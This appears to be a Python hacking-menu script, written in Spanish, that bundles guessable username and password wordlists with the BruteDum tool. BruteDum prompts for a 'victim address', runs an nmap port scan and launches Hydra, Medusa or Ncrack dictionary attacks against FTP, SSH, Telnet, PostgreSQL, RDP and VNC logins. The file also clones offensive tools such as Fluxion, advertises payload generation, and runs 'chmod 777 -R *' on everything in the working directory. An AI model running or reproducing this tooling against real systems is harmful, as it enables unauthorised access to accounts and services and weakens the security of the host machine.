#!/usr/bin/python
import os
import time
import sys
import random
import requests
import re
import socket
from os import system, name, path


user_pass = ('''admin
admi
admin
universo
html
cyber
veggeta
Admin
bados
free-fire
royale
clang
free
fire
anonimo
anonimous
anoni
bills
anonymous
Aanonimous
pass
password
wordlist
kali
linux
kali-linux
start
Hacker
python
parrot
alejandro
ubuntu
blacken
redhat
deepin
lubuntu
depin
gogeta
hacker
tor
2000
error
2001
2002
1999
root
home
space
2003
2004
2005
red-tor
redtor
enero
2006
2007
2008
home
2009
2010
2020
goku
febrero
user
usuario
xmr7
marzo
administrador
abril
mayo
junio
administrativo
2011
homme
2013
2012
security
2014
wine
seguridad
2015
2016
2017
2018
2019
hack
black
hackblack
julio
anonsurf
decsec
agosto
metasploit
supersu
super
user-root
septiembre
octubre
october
novienbre
juan
adrian
diciembre
cuarenta
curentena
1234
4321
0000
docker
python
aaaa
dead
deat
muerte
sudo
sudosu
sudo su
we are hacker
2222
1010
wearehacker
123456
1111
12345
mexico
peru
amor
123
vida
love
loveyou
you
live
5678
scan
56789
mylife

estudio
mrhacker
mr hacker
jhom
jhon
fores
benjamin
mr-rebot
mr robot
mr-roboth
mr roboth
roboth
scryp
1010
tool
nombre
anom''')
def colores ():
    listas = ['\033[1;36m','\033[1;31m','\033[1;34m','\033[1;30m','\033[1;37m','\033[1;35m','\033[1;32m','\033[1;33m']
    indice=random.randrange(len(listas))
    lista=listas[indice]
    print(lista)




user_user = ('''admin
admi
admin
Admin
cyber
anonimo
anonimous
anoni
anonymous
benjamin
mr-rebot
mr robot
mr-roboth
mr roboth
roboth
Aanonimous
pass
password
wordlist
kali
linux
kali-linux
start
Hacker
parrot
ubuntu
redhat
deepin
depin
gogeta
hacker
tor
2000
2001
2002
1999
root
home
space
2003
2004
2005
red-tor
redtor
enero
2006
2007
2008
2009
2010
2020
goku
febrero
user
usuario
marzo
administrador
abril
mayo
junio
administrativo
2011
2013
2012
2014
2015
2016
2017
2018
2019
hack
black
hackblack
julio
anonsurf
agosto
metasploit
supersu
super
user-root
septiembre
octubre
october
novienbre
juan
diciembre
cuarenta
curentena
1234
4321
0000
docker
aaaa
dead
deat
muerte
sudo
sudosu
sudo su
we are hacker
2222
1010
wearehacker
123456
1111
12345
mexico
peru
amor
123
vida
love
loveyou
you
live
5678
scan
56789
mylife
estudio
mrhacker
mr hacker
jhom
jhon
fores
scryp
1010
    
tool
anom
''')
#print (user)
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)
def fth ():
    colores()
    listalinuxs = ['''
                ██████      █████       █████
               ███░░███    ░░███       ░░███
              ░███ ░░░     ███████      ░████████
             ███████      ░░░███░       ░███░░███
            ░░░███░         ░███        ░███ ░███
              ░███          ░███ ███    ░███ ░███
              █████     ██  ░░█████  ██ ████ █████
             ░░░░░     ░░    ░░░░░  ░░ ░░░░ ░░░░░ 
                                            ''','''
        '########::::::'########::::::'##::::'##:
         ##.....:::::::... ##..::::::: ##:::: ##:
         ##::::::::::::::: ##::::::::: ##:::: ##:
         ######::::::::::: ##::::::::: #########:
         ##...:::::::::::: ##::::::::: ##.... ##:
         ##:::::::'###:::: ##::::'###: ##:::: ##:
         ##::::::: ###:::: ##:::: ###: ##:::: ##:
        ..::::::::...:::::..:::::...::..:::::..::
                                            ''','''
                ███████╗████████╗██╗  ██╗
                ██╔════╝╚══██╔══╝██║  ██║
                █████╗     ██║   ███████║
                ██╔══╝     ██║   ██╔══██║
                ██║██╗     ██║██╗██║  ██║
                ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝ 
                                 ''','''
            O))  O))           O))
          O)     O))  O))      O)) O)
        O)O) O)O)O) O)O))      O))   O)) O))  O))  O))O))   O))
          O))    O))  O) O)    O))O)) O))  O))O))  O))  O) O))
          O))    O))  O))  O)) O))O)) O))  O))O))  O))   O)
          O))    O))  O)   O)) O))O)) O))  O))O))  O)) O)  O))
          O))     O)) O))  O))O)))O))O)))  O))  O))O))O))   O))
''','''
    .%%%%%%..%%%%%%..%%..%%..%%......%%%%%%..%%..%%..%%..%%..%%..%%.
    .%%........%%....%%..%%..%%........%%....%%%.%%..%%..%%...%%%%..
    .%%%%......%%....%%%%%%..%%........%%....%%.%%%..%%..%%....%%...
    .%%........%%....%%..%%..%%........%%....%%..%%..%%..%%...%%%%..
    .%%........%%....%%..%%..%%%%%%..%%%%%%..%%..%%...%%%%...%%..%%.
    ................................................................
''','''
                                                                                             
    @@@@@@@@  @@@@@@@  @@@  @@@             @@@       @@@  @@@  @@@  @@@  @@@  @@@  @@@  
    @@@@@@@@  @@@@@@@  @@@  @@@             @@@       @@@  @@@@ @@@  @@@  @@@  @@@  @@@  
    @@!         @@!    @@!  @@@             @@!       @@!  @@!@!@@@  @@!  @@@  @@!  !@@
    !@!         !@!    !@!  @!@             !@!       !@!  !@!!@!@!  !@!  @!@  !@!  @!!
    @!!!:!      @!!    @!@!@!@!  @!@!@!@!@  @!!       !!@  @!@ !!@!  @!@  !@!   !@@!@! 
    !!!!!:      !!!    !!!@!!!!  !!!@!@!!!  !!!       !!!  !@!  !!!  !@!  !!!    @!!! 
    !!:         !!:    !!:  !!!             !!:       !!:  !!:  !!!  !!:  !!!   !: :!! 
    :!:         :!:    :!:  !:!              :!:      :!:  :!:  !:!  :!:  !:!  :!:  !:! 
    ::          ::    ::   :::              :: ::::   ::   ::   ::  ::::: ::   ::  ::: 
     :           :      :   : :             : :: : :  :    ::    :    : :  :    :   :: ''']

    indice=random.randrange(len(listalinuxs))
    listalinux=listalinuxs[indice]
    slowprint(listalinux)
fth()
def clear ():
    os.system('clear')
def help ():

    print ('''\n                                   \033[1;1m<------Menu_de ayuda_------>\n
									\033[1;1m\033[1;31mCopyright (c) 2021
									    by hacker-pc''')    
    ayuda = '''
    				       \033[1;4m\033[1;31m\033[1;44m\033[1;1m------Nota------\033[1;0m
        \033[1;44m\033[1;32m_____________________________________________________________________________________\033[1;0m
	\033[1;32m\033[1;44m|\033[1;0m    Para ahorrarte trabajo el mismo creador del scrypt a creado un diccionario     \033[1;32m\033[1;44m|\033[1;0m
	\033[1;32m\033[1;44m|\033[1;0m    con posibles password y user puedes crearlos y darles usos en el apartado      \033[1;32m\033[1;44m|\033[1;0m
	\033[1;32m\033[1;44m|\033[1;0m    de contraseña y usuario --------------- tambien el creador de contraseña       \033[1;32m\033[1;44m|\033[1;0m
	\033[1;32m\033[1;44m|\033[1;0m    te generara y podras guardar cada [user y pass] en la lista de diccionarios    \033[1;32m\033[1;44m|\033[1;0m
	\033[1;32m\033[1;44m|\033[1;0m    del scrypt para darle uso en otra ocacion --------------------------------     \033[1;32m\033[1;44m|\033[1;0m
	\033[1;32m\033[1;44m|\033[1;32m\033[1;44m-----------------------------------------------------------------------------------\033[1;32m\033[1;44m|\033[1;0m
	\033[1;32m\033[1;44m____________________________________________________________________________________|\033[1;0m 
	\033[1;32m\033[1;44m|\033[1;0m     Tambien tendra  el privilejio de editar sus diccionarios desde el directorio  \033[1;32m\033[1;44m|\033[1;0m 
	\033[1;32m\033[1;44m|\033[1;0m     de la herramienta.. ya que automaticamente el scrypt le heredara privilegios  \033[1;32m\033[1;44m|\033[1;0m 
	\033[1;32m\033[1;44m|\033[1;0m     \033[1;36m--------------------------------\033[1;0m\033[1;1msuper-user\033[1;36m----------------------------------\033[1;0m  \033[1;32m\033[1;44m|\033[1;0m 
	\033[1;32m\033[1;44m|-----------------------------------------------------------------------------------|\033[1;0m 

	|-------------------------------------------------------------------------------------|
	|_____________________________________________________________________________________|
	|\033[1;1m                                                                                     |
	|	\033[1;31muse Brute\033[1;0m [dara paso al scrypt brute, basado en [brutedum]                    |
	|	                                                                              |
	|	\033[1;31mcreate_new_pass\033[1;0m  [Crea una nueva lista de deccionario manual]                 |           
	|	\033[1;31mcreate_new_user\033[1;0m  [Crea una nueva lista de diccionario manual ]                |
	|	\033[1;31mcreate pass list\033[1;0m  [crea la lista de diccionario creada por el usuario]        |
	|	\033[1;31mcreate user list\033[1;0m  [crea la lista de diccionario creada por el usuario]        |
	|	\033[1;31mclear\033[1;0m  [LIMPIA LA PANTALLA ]                                                  |
	|	\033[1;31muse force_brute\033[1;0m  [con este comando podra hacer fuerza bruta a ftp,ssh.etc]    |
	|	\033[1;31mopen msfconsole\033[1;0m  [podras tambien ejecutar metasploit desde la misma scryp]    |
	|	\033[1;31muse hacker_git\033[1;0m  [como instancia con solo este comando se instalara una tools] |
	|	creada por el usuario disponible en github                                    |
	|	\033[1;31mcreate automated payload\033[1;0m [crearas un payload automatizado[windows/android]    |
	|	Tambien podras llamar cualquier herramienta del sistema..                     |
	|	escribiendo el nombre  de la herramienta                                      |
	|	Ejemplo [ nmap 127.0.0.1 ] etc                                                |
	|	\033[1;31mset fb-id\033[1;0m  [dara paso a una herramienta capaz de sacar el id de un facebook]  |
	|                                                                                     |
        |============================= programming and security ==============================|
        |                                                                                     |
        |       \033[1;31msublime text install\033[1;0m [ Instalations of sublime text ]                         |
        |       \033[1;31mtor-desktop install\033[1;0m [Dara instalacion a [tor-Desktop]                         |
        |       \033[1;31m.\033[1;0m                                                                             |
        |=============================   scanneo and osing web  ==============================|
        |       \033[1;31mapt install wig\033[1;0m [Eres [ubuntu] y quieres scannear paginas web ..]             |
                \033[1;31muse check-pass\033[1;0m[cheka si tu contraseña a sido expuesta]

            		                   |    [help] [exit]   |

    '''
    print (ayuda)

def fluxion ():
    a = ('fluxion') 
    print ('instalacion de ' + a)
    fluxio = os.system('git clone https://github.com/FluxionNetwork/fluxion.git')
    clear()
    os.system('mv fluxion /root')
    os.system('cd fluxion')
    os.system('bash fluxion.sh')
    os.system('./fluxion.sh -i')
    print("\n\n Instalado con exito [/root] \n")

def create_new_Pass ():
    print('Creando .txt ....')
    time.sleep(2)
    os.system ('nano New_Pass.txt')
    print('Creado con exito ....')

    
def create_new_user ():
    print('Creando .txt ....\n')
    time.sleep(2)
    os.system ('nano New_user.txt')
    print('Creado con exito ....')
def password ():
    diccionaripass = open('user_pass.txt', 'a')
    diccionaripass.write(user_pass)

def usuarios ():
    diccionariuser = open('user_user.txt', 'a')
    diccionariuser.write(user_user)

def menu ():
    colores()
    print('  \033[1;34m           _____________________________________________  ')
    print('  \033[1;34m           ||\033[1;40m_________________\033[1;31m\033[1;31mMenu\033[1;0m\033[1;34m\033[1;40m_____________________\033[1;0m\033[1;34m||\033[1;0m')

    print('  \033[1;34m           ||  --------------------------------------  ||\033[1;0m')
    print('  \033[1;34m           ||                                          ||\033[1;0m')
    print('  \033[1;34m           ||  --------------------------------------  ||\033[1;0m')
    print('  \033[1;34m           ||          \033[1;32mGenerar diccionario\033[1;0m\033[1;34m             ||\033[1;0m')
    print('  \033[1;34m           ||         \033[1;32mCrear nuevo diccionario\033[1;0m\033[1;34m          ||\033[1;0m')
    print('  \033[1;34m           ||         \033[1;32minteracion del systema\033[1;0m\033[1;34m           ||\033[1;0m')
    print('  \033[1;34m           ||  ______________________________________  ||\033[1;0m')
    print('  \033[1;34m           ||  --------------------------------------  ||\033[1;0m')
    print('  \033[1;34m           ||                                          ||\033[1;0m')
    print('  \033[1;34m           ||  --------------------------------------  ||\033[1;0m')
    print('  \033[1;34m           ||  [Escribe [\033[1;36m\033[1;4mhelp\033[1;0m\033[1;34m] para ver modo de uso ]  ||\033[1;0m')
    print('  \033[1;34m           ||  --------------------------------------  ||\033[1;0m')
    print('  \033[1;34m           ||                                          ||\033[1;0m')
    print('  \033[1;34m           ||___________\033[1;44m\033[1;32mby_anonimo_hackerpc\033[1;0m\033[1;34m____________||\033[1;0m')
    colores()
    print(' \n            -------------------welcome---------------------\n')
menu()  

def brutedum () :
    class Color:
        no_colored = "\033[0m"
        white_bold = "\033[1;37m"
        blue_bold = "\033[1;96m"
        green_bold = "\033[1;92m"
        red_bold = "\033[1;91m"
        yellow_bold = "\033[1;33m"

    def banner():
        print(Color.yellow_bold+"""888888                           888888                """+Color.no_colored+"""BRUTE            
    """+Color.yellow_bold+"""8    8   eeeee  e   e eeeee eeee 8    8 e   e eeeeeee  """+Color.no_colored+"""FORCE
    """+Color.yellow_bold+"""8eeee8ee 8   8  8   8   8   8    8e   8 8   8 8  8  8  """+Color.no_colored+"""ONLY
    """+Color.yellow_bold+"""88     8 8eee8e 8e  8   8e  8eee 88   8 8e  8 8e 8  8  """+Color.no_colored+"""FOR
    """+Color.yellow_bold+"""88     8 88   8 88  8   88  88   88   8 88  8 88 8  8  """+Color.no_colored+"""THE
    """+Color.yellow_bold+"""88eeeee8 88   8 88ee8   88  88ee 88eee8 88ee8 88 8  8  """+Color.no_colored+"""DUMMIES

    """+Color.yellow_bold+"""[i]"""+Color.no_colored+""" BruteDum - Brute Force attacks SSH, FTP, Telnet, PostgreSQL, RDP, VNC with Hydra, Medusa and Ncrack
        Author: """+Color.yellow_bold+"""https://GitHackTools.blogspot.com \n""")

    def clear():
        if name == 'nt':
            system('cls')
        else:
            system('clear')


    def invalid_choice():
        print(Color.red_bold+"[!]"+Color.no_colored+" Invalid choice \n"+Color.white_bold+"Exiting...",exit())


    def info(victim, protocol):
        print(Color.yellow_bold+'[i]'+Color.no_colored+' Target: '+Color.white_bold+'{}'.format(victim))
        print(Color.no_colored+'    Protocol: '+Color.white_bold+'{}'.format(protocol))


    def about():
        print(Color.yellow_bold+"[i]"+Color.no_colored+" Remember to the coder:")
        print("    Website: "+Color.yellow_bold+"https://githacktools.blogspot.com",Color.no_colored)
        print("    Facebook: "+Color.yellow_bold+"@GitHackTools",Color.no_colored)
        print("    Twitter: "+Color.yellow_bold+"@SecureGF",Color.no_colored, exit())


    def continue_or_not():
        try:
            print()
            choice = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to continue? [Y/n]:'+Color.white_bold+' '))

            if choice[0].upper() == 'Y':
                clear()
                banner()
                start()
            else:
                print()
                about()

        except (KeyboardInterrupt, IndexError):
            print()
            about()


    def check_port(victim, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port = sock.connect_ex((victim,port))

        if port == 0:
            sock.close
            return True
        else:
            sock.close
            return False


    def change_port(victim):
        try:
            port = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the port you want to crack:'+Color.white_bold+' '))

            if check_port(victim, port) == True:
                return port
            else:
                print(Color.red_bold+"[!]"+Color.no_colored+" That port is not open")
                print()
                change_port(victim)


        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except ValueError:
            print(Color.red_bold+'[!]'+Color.no_colored+' Invalid input')
            change_port(victim)


    def username(choice):
        try:
            if choice == 'Y':
                user_path = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the path of user list:'+Color.white_bold+' '))
                user_path = user_path.strip().strip("'")

                if path.isfile(user_path) == True:
                    return user_path
                else:
                    print(Color.red_bold+"[!]"+Color.no_colored+" That path is doesn't exist")
                    username(choice)

            elif choice == 'N':
                user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the username: '+Color.white_bold))
                return user

        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except IndexError:
            invalid_choice()


    def password():
        try:
            wordlist_path = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the path of wordlist:'+Color.white_bold+' '))
            wordlist_path = wordlist_path.strip().strip("'")

            if path.isfile(wordlist_path) == True:
                return wordlist_path
            else:
                print(Color.red_bold+"[!]"+Color.no_colored+" That path os doesn't exist")
                password()

        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except IndexError:
            invalid_choice()


    def start():
        try:
            victim = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Enter the victim address:'+Color.white_bold+' '))

            if len(victim) == 0:
                print(Color.red_bold+"[!]"+Color.no_colored+" Invalid input")
                start()  

            else:
                choice = str(input(Color.blue_bold+"[?]"+Color.no_colored+" Do you want to scan victim's ports with Nmap? [Y/n]:"+Color.white_bold+" "))

                if choice[0].upper() == 'Y':
                    clear()
                    print(Color.green_bold+'[+]'+Color.no_colored+' Scanning ports with Nmap...\n')
                    system('nmap {}'.format(victim))
                    menu(victim)

                elif choice[0].upper() == "N":
                    menu(victim)
                else:
                    invalid_choice()

        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except IndexError:
            invalid_choice()


    def menu(victim):
        try:
            print(Color.white_bold+"""
        [1] FTP                       [2] Telnet 
            (Default port is 21)          (Default port is 23)
        [3] PostgreSQL                [4] SSH     
            (Default port is 5432)        (Default port is 22)
        [5] RDP                       [6] VNC
            (Default port is 3389)        (Default port is 5900)\n""",Color.no_colored)
            protocol = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Which protocol do you want to crack? [1-6]:'+Color.white_bold+' '))
            
            if protocol == 1:
                menu_tool(victim,"ftp")
            elif protocol == 2:
                menu_tool(victim, "telnet")
            elif protocol == 3:
                menu_tool(victim, "postgres")
            elif protocol == 4:
                menu_tool(victim, "ssh")
            elif protocol == 5:
                menu_tool(victim, "rdp")
            elif protocol == 6:
                menu_tool(victim, "vnc")
            else:
                clear()
                print(Color.red_bold+'[!]'+Color.no_colored+' Please re-enter your choice')
                menu(victim)
        
        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except ValueError:
            invalid_choice()


    def menu_tool(victim, protocol):
        try:
            clear()
            banner()
            info(victim, protocol)
            if protocol == "postgres":
                print(Color.white_bold+"""\n    [1] Ncrack (Only support default port)
        [2] Hydra (Recommended)
        [3] Medusa\n"""+Color.no_colored)

            else:
                print(Color.white_bold+"""\n    [1] Ncrack
        [2] Hydra (Recommended)
        [3] Medusa\n"""+Color.no_colored)

            tool = int(input(Color.blue_bold+'[?]'+Color.no_colored+' Which tool do you want to use? [1-3]:'+Color.white_bold+' '))

            if tool == 1:
                ncrack(victim, protocol)
            elif tool == 2:
                hydra(victim, protocol)
            elif tool == 3:
                medusa(victim, protocol)
            else:
                invalid_choice()

        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except ValueError:
            invalid_choice()


    def ncrack(victim, protocol):
        try:
            clear()
            banner()
            info(victim, protocol)

            if protocol == "postgres":
                choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))
                
                if choice_user[0].upper() == 'N':
                    user = username('N')
                    wordlist = password()
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                    system('ncrack -v --user "{}" -P {} {}:5432'.format(user, wordlist, victim))

                elif choice_user[0].upper() == 'Y':
                    user_path = username('Y')
                    wordlist = password()
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                    system('ncrack -v -U {} -P {} {}:5432'.format(user_path, wordlist, victim))

                else:
                    invalid_choice()
                    
            elif protocol == "vnc":
                wordlist = password()
                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]'))
                
                if choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                    system('ncrack -v -P {} vnc://{}:{}'.format(wordlist, victim, port))
                    
                elif choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                    system('ncrack -v -P {} {}:5900'.format(wordlist, victim))
                    
                else:
                    invalid_choice()
                    
            else:
                choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))

                if choice_user[0].upper() == 'N':
                    user = username('N')
                    wordlist = password()

                    choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                    if choice_port[0].upper() == 'Y':
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                        system('ncrack -v --user "{}" -P {} {}://{}'.format(user, wordlist, protocol, victim))

                    elif choice_port[0].upper() == 'N':
                        port = change_port(victim)
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                        system('ncrack -v --user "{}" -P {} {}://{}:{}'.format(user, wordlist, protocol, victim, port))

                    else:
                        invalid_choice()

                elif choice_user[0].upper() == 'Y':
                    user_path = username('Y')
                    wordlist = password()

                    choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                    if choice_port[0].upper() == 'Y':
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                        system('ncrack -v -U {} -P {} {}://{}'.format(user_path, wordlist, protocol, victim))

                    elif choice_port[0].upper() == 'N':
                        port = change_port(victim)
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Ncrack is cracking...')
                        system('ncrack -v -U {} -P {} {}://{}:{}'.format(user_path, wordlist, protocol, victim, port))

                else:
                    invalid_choice()

            continue_or_not()

        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except IndexError:
            invalid_choice()


    def medusa(victim, protocol):
        try:
            clear()
            banner()
            info(victim, protocol)
            
            if protocol == "vnc":
                wordlist = password()
                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))
                
                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                    system('medusa -P {} -h {} -M {}'.format(wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                    system('medusa -P {} -h {} -M {} -n {}'.format(wordlist, victim, protocol, port))

                else:
                    invalid_choice()
                    
            else:
                choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))

                if choice_user[0].upper() == 'Y':
                    user_path = username('Y')
                    wordlist = password()

                    choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                    if choice_port[0].upper() == 'Y':
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                        system('medusa -U {} -P {} -h {} -M {}'.format(user_path, wordlist, victim, protocol))

                    elif choice_port[0].upper() == 'N':
                        port = change_port(victim)
                        clear()
                        print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                        system('medusa -U {} -P {} -h {} -M {} -n {}'.format(user_path, wordlist, victim, protocol, port))

                    else:
                        invalid_choice()


                elif choice_user[0].upper() == 'N':
                    user = username('N')
                    wordlist = password()

                    choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                    if choice_port[0].upper() == 'Y':
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                        system('medusa -u "{}" -P {} -h {} -M {}'.format(user, wordlist, victim, protocol))

                    elif choice_port[0].upper() == 'N':
                        port = change_port(victim)
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Medusa is cracking...\n')
                        system('medusa -u "{}" -P {} -h {} -M {} -n {}'.format(user, wordlist, victim, protocol, port))

                    else:
                        invalid_choice()

                else:
                    invalid_choice()

            continue_or_not()

        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except IndexError:
            invalid_choice()


    def hydra(victim, protocol):
        try:
            clear()
            banner()
            info(victim, protocol)

            if protocol == "vnc":
                wordlist = password()
                choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                if choice_port[0].upper() == 'Y':
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                    system('hydra -P {} {} {} -I'.format(wordlist, victim, protocol))

                elif choice_port[0].upper() == 'N':
                    port = change_port(victim)
                    clear()
                    info(victim, protocol)
                    print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                    system('hydra -P {} {} {} -s {} -I'.format(wordlist, victim, protocol, port))

                else:
                    invalid_choice()

            else:
                choice_user = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use username list? [Y/n]:'+Color.white_bold+' '))
            
                if choice_user[0].upper() == 'Y':
                    user_path = username('Y')
                    wordlist = password()

                    choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                    if choice_port[0].upper() == 'Y':
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                        system('hydra -L {} -P {} {} {} -I'.format(user_path, wordlist, victim, protocol))

                    elif choice_port[0].upper() == 'N':
                        port = change_port(victim)
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                        system('hydra -L {} -P {} {} {} -s {} -I'.format(user_path, wordlist, victim, protocol, port))

                    else:
                        invalid_choice()


                elif choice_user[0].upper() == 'N':
                    user = username('N')
                    wordlist = password()

                    choice_port = str(input(Color.blue_bold+'[?]'+Color.no_colored+' Do you want to use default port? [Y/n]:'+Color.white_bold+' '))

                    if choice_port[0].upper() == 'Y':
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                        system('hydra -l "{}" -P {} {} {} -I'.format(user, wordlist, victim, protocol))

                    elif choice_port[0].upper() == 'N':
                        port = change_port(victim)
                        clear()
                        info(victim, protocol)
                        print(Color.green_bold+'[+]'+Color.no_colored+' Hydra is cracking...\n')
                        system('hydra -l "{}" -P {} {} -s {} {} -I'.format(user, wordlist, victim, port, protocol))

                    else:
                        invalid_choice()

                else:
                    invalid_choice()

            continue_or_not()

        except KeyboardInterrupt:
            print()
            print(Color.white_bold+'Exiting...')
            exit()
        except IndexError:
            invalid_choice()


    clear()
    banner()
    start()   

def chmod ():
    os.system('chmod 777 -R *')

def creacion ():
    chmod()
    usr_pas = input('\033[1;44m==>menu-->>\033[1;0m\033[1;36m\033[1;4m $ \033[1;0m')
    if usr_pas == 'use user' :
        print('''\n\n
        para agregar tus propias palabras\n
        debes crear generar el diccionario user-pas \n\n
                            espera
          \n\n''')
        print ('\nSi ya lo isiste antes preciona [n]\n\n')
        dic = input('[y/n] $ ')
        if dic == 'y' :
            usuarios()
            password()
            print('Listo quieres agregar palabras de [use](pass/user) escribe ')
            pausr = input('[pass/user] $ ')
            if pausr == 'pass' :
                os.system ('nano user_pass.txt')
                creacion()
            elif pausr == 'user' :
                os.system('nano user_user.txt')
                creacion()
            elif pausr == 'create_new pass' :
                os.system('nano New_Pass.txt')
                creacion()
            elif pausr == 'create_new user' :
                os.system('nano New_user.txt')
                creacion()
            else:
                print('ERROR OPCION INVALIDA ... ')
        elif dic == 'n' :
            pausr = input('[pass/user] $ ')
            if pausr == 'pass' :
                os.system ('nano user_pass.txt')
                creacion()
            elif pausr == 'user' :
                os.system('nano user_user.txt')
                creacion()
            elif pausr == 'create_new pass' :
                os.system('nano New_Pass.txt')
                creacion()
            elif pausr == 'create_new user' :
                os.system('nano New_user.txt')
                creacion()
            elif pausr == 'clear' :
                clear()
                creacion()
            else:
                print('ERROR OPCION INVALIDA ... ')
    elif usr_pas == 'use pass' :
        print('''\n\n
        para agregar tus propias palabras\n
        debes crear generar el diccionario user-pas \n\n
                            espera
          \n\n''')
        print ('\nSi ya lo isiste antes preciona [n]\n\n')
        dic = input('[y/n] $ ')
        if dic == 'y' :
            usuarios()
            password()
            print('Listo quieres agregar palabras de [use](pass/user) escribe \n\n')
            pausr = input('[pass/user] $ ')
            if pausr == 'pass' :
                os.system ('nano user_pass.txt')
                creacion()
            elif pausr == 'user' :
                os.system('nano user_user.txt')
                creacion()
            elif pausr == 'create_new pass' :
                os.system('nano New_Pass.txt')
                creacion()
            elif pausr == 'create_new user' :
                os.system('nano New_user.txt')
                creacion()
            elif pausr == 'help' :
                help()
                creacion()
            elif pausr == 'exit' :
                print ('Saludes un gusto adios')
                os.system('exit') 
            elif pausr == 'clear' :
                clear()
                creacion()
            else:
                print('ERROR OPCION INVALIDA ... ')
        elif dic == 'n' :
            pausr = input('[pass/user] $ ')
            if pausr == 'pass' :
                os.system ('nano user_pass.txt')
                creacion()
            elif pausr == 'user' :
                os.system('nano user_user.txt')
                creacion()
            elif pausr == 'create_new pass' :
                os.system('nano New_Pass.txt')
                creacion()
            elif pausr == 'create_new user' :
                os.system('nano New_user.txt')
                creacion()
            elif pausr == 'help' :
                help()
                creacion()
            elif pausr == 'exit' :
                print ('Saludes un gusto adios')
                os.system('exit')
            elif pausr == 'clear' :
                clear()
                creacion()
            else:
                print('ERROR OPCION INVALIDA ... ')
    elif usr_pas == 'menu' :
        menu()
    elif usr_pas == 'help' :
        clear()
        colores()
        help()
        colores()
        creacion()
    elif usr_pas == 'use hacker_git' :
        colores()
        print (' Instalando ')
        time.sleep(1)
        print('Instalacion..escribe la ruta a guardar la herramienta .. \n')
        instalacion = input('$rute $ ')
        os.system ('git clone https://github.com/anonymous-sys19/Hacker.git')
        os.system ("mv Hacker " + instalacion)
